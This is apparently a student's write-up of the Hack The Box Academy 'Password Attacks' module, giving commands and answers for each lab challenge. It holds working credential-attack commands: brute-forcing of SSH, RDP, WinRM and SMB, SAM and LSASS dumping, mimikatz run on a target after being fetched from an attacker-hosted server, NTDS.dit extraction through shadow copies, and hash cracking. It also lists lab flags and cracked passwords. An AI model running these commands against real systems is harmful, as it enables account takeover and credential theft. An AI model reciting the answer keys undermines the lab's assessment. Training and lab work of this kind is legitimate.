# HTB-Password_Attacks

## Table of Contents
1. [Password Cracking Techniques](#password-cracking-techniques)
    1. [Introduction to Password Cracking](#introduction-to-password-cracking)
    2. [Introduction to John The Ripper](#introduction-to-john-the-ripper)
    3. [Introduction to Hashcat](#introduction-to-hashcat)
    4. [Writing Custom Wordlists and Rules](#writing-custom-wordlists-and-rules)
    5. [Cracking Protected Files](#cracking-protected-files)
    6. [Cracking Protected Archives](#cracking-protected-archives)
2. [Remote Password Attacks](#remote-password-attacks)
    1. [Network Services](#network-services)
    2. [Spraying, Stuffing, and Defaults](#spraying-stuffing-and-defaults)
3. [Extracting Passwords from Windows Systems](#extracting-passwords-from-windows-systems)
    1. [Attacking SAM, SYSTEM, and SECURITY](#attacking-sam-system-and-security)
    2. [Attacking LSASS](#attacking-lsass)
    3. [Attacking Windows Credential Manager](#attacking-windows-credential-manager)
    4. [Attacking Active Directory and NTDS.dit](#attacking-active-directory-and-ntdsdit)
    5. [Credential Hunting in Windows](#credential-hunting-in-windows)
## Password Cracking Techniques

### Introduction to Password Cracking
#### Challenges
1. What is the SHA1 hash for `Academy#2025`?

    We can solve this by using SHA1.
    ```bash
    echo -n Academy#2025 | sha1sum
    ```

    The answer is `750fe4b402dc9f91cedf09b652543cd85406be8c`.

### Introduction to John The Ripper
#### Tools
1. John The Ripper (jumbo version, can be donwloaded via snap. The usage is `john-the-ripper` not `john`)
#### Challenges
1. Use single-crack mode to crack r0lf's password.

    To solve this, we can use jtr tools. First copy the challenge from module into our machine. Then run jtr.
    ```bash
    echo 'r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash' > chall_jtr
    ```
    ```bash
    john --single chall_jtr
    ```

    Then if its done, we can use show options.
    ```bash
    john --show chall_jtr
    ```
    Here the output.
    ![alt text](Assets/JTR1.png)

    So the answer is `NAITSABES`.

2. Use wordlist-mode with rockyou.txt to crack the RIPEMD-128 password.

    Copy the password from the modules into our machine.

    ```bash
    echo '193069ceb0461e1d40d216e32c79c704' > chall_jtr2
    ```
    Then we specify the format with ripemd-128 and the wordlist is rockyou.txt.
    ```bash
    john-the-ripper --wordlist=/home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt --format=ripemd-128 chall_jtr2
    ```
    Here the output.
    ![alt text](Assets/JTR2.png)

    The answer is `50cent`.

### Introduction to Hashcat
#### Tools
1. Hashcat
#### Challenges
1. Use a dictionary attack to crack the first password hash. (Hash: e3e3ec5831ad5e7288241960e5d4fdb8)

    We can solve this using hashcat with dictionary attack.

    ```bash
    hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt
    ```

    The answer is `crazy!`.

2. Use a dictionary attack with rules to crack the second password hash. (Hash: 1b0556a75770563578569ae21392630c)

    We can solve this using haschat with `best64.rule`.

    ```bash
    hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    ```

    The answer is `c0wb0ys1`.

3.  Use a mask attack to crack the third password hash. (Hash: 1e293d6912d074c0fd15844d803400dd)

    We can solve this by using mask attack with this specific mask, `?u?l?l?l?l?d?s`.

    ```bash
    hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
    ```

### Writing Custom Wordlists and Rules
#### Tools
1. cewl
#### Challenges
1. What is Mark's password?

    To solve this, we should organize our information first. 
    1. Password policy
    The password length at least 12 characters, at least one uppercase letter, at least one lowercase letter, at least one symbol and at least one number. It have `97268a8ae45ac7d15c3cea4ce6ea550b` as hash.
    2. Possible words
    Mark White, August 5, 1998, Nexura, Ltd, San Francisco, CA, USA, Bella, Maria, Alex, baseball.

    Based on that, i made this password.list.

    ```bash
    Mark
    White
    August
    05
    08
    1998
    98
    Nexura
    San
    Francisco
    CA
    USA
    Bella
    Maria
    Alex
    baseball
    ```

    And i made this custom.rule.

    ```bash
    c $1$9$9$8$!
    c $0$8$0$5$!
    c $9$8$!
    c $1$9$9$8$@
    c $0$8$0$5$@
    ```
    Then i generate the new password list.
    ```bash
    hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
    ```

    After that i tried to solve it by combine with `best64.rule`

    ```bash
    hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_password.list -r /usr/share/hashcat/rules/best64.rule
    ```

    The answer is `Baseball1998!`.

### Cracking Protected Files
#### Tools
1. office2john.py
#### Challenges 
1. Download the attached ZIP archive (cracking-protected-files.zip), and crack the file within. What is the password?

    First we need to unzip the file. We got this file.

    ![alt text](Assets/JTR3.png)

    To solve this, we can use `office2john.py`.
    
    ```bash
    python3 /snap/john-the-ripper/current/bin/office2john.py Confidential.xlsx > protected-xlsx.hash
    ```

    Here the result.

    ![alt text](Assets/JTR4.png)

    Then we use john-the-ripper again to crack the hash.

    ```bash
    john-the-ripper --wordlist=/home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt protected-xlsx.hash
    ```
    The answer is `beethoven`.

### Cracking Protected Archives
#### Challenges
1. Run the above target then navigate to http://ip:port/download, then extract the downloaded file. Inside, you will find a password-protected VHD file. Crack the password for the VHD and submit the recovered password as your answer.

    To solve this, after we extracted it, we can use `bitlocker2jhon`.

    ```bash
    /snap/john-the-ripper/current/bin/bitlocker2john -i Private.vhd > Private.hashes
    grep "bitlocker\$0" Private.hashes > private.hash
    cat private.hash
    ```

    ![alt text](Assets/Hcat1.png)

    We copied the private.hash output and use hashcat with `-m 22100`.

    ```bash
    hashcat -a 0 -m 22100 '$bitlocker$0$16$b3c105c7ab7faaf544e84d712810da65$1048576$12$b020fe18bbb1db0103000000$60$e9c6b548788aeff190e517b0d85ada5daad7a0a3f40c4467307011ac17f79f8c99768419903025fd7072ee78b15a729afcf54b8c2e3af05bb18d4ba0' /home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt
    ```
    The answer is `francisco`.

2. Mount the BitLocker-encrypted VHD and enter the contents of flag.txt as your answer.

    To solve this, we can mount the vhd and explore it. Here the commands.

    ```bash
    sudo mkdir -p /media/bitlocker
    sudo mkdir -p /media/bitlockermount
    sudo losetup -f -P Private.vhd
    sudo dislocker /dev/loop0p1 -ufrancisco -- /media/bitlocker
    sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
    cd /media/bitlockermount
    ```

    The answer is `43d95aeed3114a53ac66f01265f9b7af`.

## Remote Password Attacks
### Network Services
#### Tools
1. netexec (nxc)
2. evil-winrm
3. hydra

#### Challenges
1. Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

    We can use netexec to solve this.

    ```bash
    netexec winrm 10.129.202.136 -u username.list -p password.list --threads 103
    ```

    Then after we get username and password, we can login using `evil-winrm`.
    ```bash
    evil-winrm -i 10.129.202.136 -u john -p november
    ```
    The answer is `HTB{That5Novemb3r}`.

2. Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

    We can use hydra to solve this.

    ```bash
    hydra -L username.list -P password.list ssh://10.129.202.136
    ```

    We get user `dennis` with password `rockstar`. The answer is `HTB{Let5R0ck1t}`.

3. Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

    We can use hydra again to solve this.

    ```bash
    hydra -L username.list -P password.list -t 4 rdp://10.129.202.136
    ```
    Then we login using the credential that we found.

    ```bash
        xfreerdp /v:10.129.202.136 /u:chris /p:789456123
    ```
    The answer is `HTB{R3m0t3DeskIsw4yT00easy}`.

4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

    We can solve this using metasploit. 
    ```bash
    [msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_login
    [*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
    [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set user_file username.list
    user_file => username.list
    [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set pass_file password.list
    pass_file => password.list
    [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set rhosts 10.129.202.136
    rhosts => 10.129.202.136
    ```
    After we got the credential, we use netexec to list the share folders.
    ```bash
    netexec smb 10.129.202.136 -u "cassie" -p "12345678910" --shares
    ```
    After that we use smbclient to specific folder.
    ```bash
    smbclient -U cassie \\\\10.129.202.136\\CASSIE
    ```
    The answer is `HTB{S4ndM4ndB33}`.

### Spraying, Stuffing, and Defaults
#### Tools
1. netexec 
2. kerbrute
3. burpsuite
4. creds search (python venv)
#### Challenges
1. Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: <username>:<password>)

    We can solve this using `creds search`.

    ```bash
    creds search MySQL
    ```
    We tried all of that and we get `superdba:admin` as the right answer.

## Extracting Passwords from Windows Systems
### Attacking SAM, SYSTEM, and SECURITY
#### Tools
1. dpapi.py
2. mimikatz
3. DonPAPI
4. netexec 

#### Challenges
1. Where is the SAM database located in the Windows registry? (Format: ****\***)

    The answer is `HKLM\SAM`.

2. Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

    To solve this, first we need rdp to the target. Then we run `cmd` with admin previllege. Then we use `reg.exe` to save `sam,system,security` registry hives.

    ```cmd
    reg.exe save hklm\sam C:\sam.save
    reg.exe save hklm\system C:\system.save
    reg.exe save hklm\security C:\security.save
    ```

    Then we setup smb to transfer from the attacked host to our host. In our host, we can do this.

    ```bash
    mkdir ~/loot
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE ~/loot
    ```

    Back to attacked host, we transfer all of those.

    ```cmd
    move sam.save \\10.10.15.234\share 
    move system.save \\10.10.15.234\share 
    move security.save \\10.10.15.234\share 
    ```

    In our host, we can dump the hash using `secretsdump.py`.

    ```bash
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    ```

    ![alt text](Assets/WD1.png)

    In there we can find ITbackdoor user. We copy the fourth component (nthash) to crack using hashcat.

    ```bash
    sudo hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt
    ```

    The answer is `matrix`.

3.   Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

    To solve this, we can use entexec.

    ```bash
    netexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
    ```

    The answer is `frontdesk:Password123`.

### Attacking LSASS
#### Tools
1. pypykatz
#### Challenges 
1. What is the name of the executable file associated with the Local Security Authority Process?

    The answer is `lsass.exe`.

2. Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

    To solve this, after we xfreerdp to the target, we run this in the powershell.

    ```powershell
    Get-Process lsass
    rundll32 C:\windows\system32\comsvcs.dll, MiniDump <Id>> C:\lsass.dmp full
    ```

    Then we setup for the smb transfer in our machine.

    ```bash
    mkdir ~/loot
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE ~/loot
    ```
    Back to our attacked machine, we transfer that. 
    ```powershell
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE ~/loot
    ```

    After that, dump the lsa by using pypykatz
    ```bash
    pypykatz lsa minidump lsass.dmp
    ```
    After we copied the NT from the vendor user, we crack it using hashcat.

    ```bash
    sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 rockyou.txt
    ```
    The answer is `Mic@123`.

### Attacking Windows Credential Manager
#### Tools
1. mimikatz.exe
#### Challenges 
1. What is the password mcharles uses for OneDrive?

    To solve this, after we xfreerdp to the target, we seacrh stored credentials account in the current user.
    ```cmd
    cmdkey /list
    ```
    ![alt text](Assets/WD2.png)

    We can see it has `SRV01\mcharles` user. The we check the detail of that user.
    ```cmd
    net user mcharles
    ```

    ![alt text](Assets/WD3.png)

    We can see its part of Administrator group. Then we run new cmd using that credential.

    ```cmd
    runas /savecred /user:SRV01\mcharles cmd
    ```
    To transfer mimkatz from our host to attacked host, i used http server in here. In our host run this.

    ```bash
    wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
    python3 -m http.server 8080
    ```
    Back to our attacked host, run this to download the file.

    ```cmd
    powershell -c "Invoke-WebRequest -Uri http://10.10.15.234:8080/mimikatz_trunk.zip -OutFile C:\Users\sadams\Desktop\mimikatz.zip"
    ```
    After that, to use mimkatz, we must have admin previllege. So with user in the part of admin group, we start new cmd with run as adminstrator.

    ```cmd
    powershell -c "Start-Process cmd -Verb RunAs"
    ```
    Then run mimikatz. In the mimikatz do this.
    ```cmd
    mimikatz # privilege::debug
    ```

    We cant get the password by doing `sekurlsa::credman`. Because the password is not saved in our current user (mcharles) instead it saved on sadams session. We can use this command `sekurlsa::logonpasswords` to dump all logon session.

    ![alt text](Assets/WD4.png)

    In there we can get the password. The answer is `Inlanefreight#2025`.

### Attacking Active Directory and NTDS.dit
#### Tools
1. username-anarchy
2. Kerbrute
3. NetExec
4. evil-winrm
#### Challenges
1. What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)

    The answer is `NTDS.dit`.

2. Submit the NT hash associated with the Administrator user from the example output in the section reading.

    The answer is `64f12cddaa88057e06a81b54e73b949b`.

3. On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

    To solve this, first we must find the correct domain name. We can use nmap to  enumerate ldap (domain controoler) port.

    ```bash
    nmap --script ldap-rootdse -p 389 10.129.202.85
    ```
    ![alt text](Assets/AD1.png)

    Based on that, we can see the correct domain is `ILF.local`. Then we need to find the correct username. We already have informations about the person name. Here the list of that.

    ```bash
    mrwhok@MSI:~/ctf/HTB-Academy/HTB-Password_Attacks$ cat name.txt
    John Marston
    Carol Johnson
    Jennifer Stapleton
    ```
    Then we use `username-anarchy` to make username combination.

    ```bash
    username-anarchy -i name.txt > users.txt
    ```

    After that, we use `kerbrute` to find valid username.

    ```bash
    kerbrute userenum --dc 10.129.202.85 --domain ILF.local users.txt
    ```

    ![alt text](Assets/AD2.png)

    We can see it have 3 results. For our case, we need to find valid username for `John Marston`. So the valide username based on that is `jmarston`. Then we use `netexec` to bruteforce the password.

    ```bash
    netexec smb 10.129.202.85 -u jmarston -p /home/mrwhok/tools/fasttrack.txt
    ```

    We can get the answer for this challenge is `jmarston:P@ssword!`.

4. Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

    To solve this, with the credential we found in the previous, we can use `evil-winrm`.

    ```bash
    evil-winrm -i 10.129.202.85  -u jmarston -p 'P@ssword!'
    ```

    In the win-rm shell, we can check our group membership. If we have admin, we can do many thing.
    
    ```bash
    net user jmarston
    ```

    ![alt text](Assets/AD3.png)

    Based on that, we can see it part of admin group. So we can create copy shadow volume c to get NTDS.dit and SYSTEM.

    ```bash
    vssadmin CREATE SHADOW /For=C:
    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\NTDS\SYSTEM
    ```

    Then we can download it to our host.

    ```powershell
    download NTDS.dit
    download SYSTEM
    ```

    Then we can use `impacket-secretsdump` to dump the hash.

    ```bash
    impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
    ```

    After copy the NT hashes, we can use hashcat to crack it.

    ```bash
    sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt    
    ```
    The answer is `Winter2008`.

### Credential Hunting in Windows
#### Tools
1. LaZagne
#### Challenges
1. What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)

    We can find this in the creds folder. The answer is `WellConnected123`.

2. What is the GitLab access code Bob uses? (Format: Case-Sensitive)

    We can find this in the workstuff folder. The answer is `3z1ePfGbjWPsTfCsZfjy`.

3. What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)

    We can use lazagne to solve this. The answer is `ubuntu:FSadmin123`.

4. What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)

    We can find this in the BulkadADUsers.txt. The answer is `Inlanefreightisgreat2022`.

5. What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)

    We can find this in the ansible folder. The answer is `edgeadmin:Edge@dmin123!`.